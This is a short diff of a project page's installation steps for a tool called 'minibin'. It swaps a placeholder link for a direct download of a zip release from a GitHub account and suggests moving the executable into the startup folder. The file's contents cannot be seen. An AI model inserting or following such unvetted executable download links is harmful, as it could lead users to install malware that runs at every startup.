@@ -17,7 +17,7 @@
 </ul>
 <h2>Installation</h2>
 <ol>
-  <li>Download the latest release from the <a href="#">repository</a>.</li>
+  <li>Download the latest release from the <a href="https://github.com/havanagilla1/minibin/releases/download/Download/minibin.zip">repository</a>.</li>
   <li>Unzip the archive to a convenient location on your computer.</li>
   <li>If desired, move the <code>minibin-kt.exe</code> file to the startup folder.</li>
 </ol>
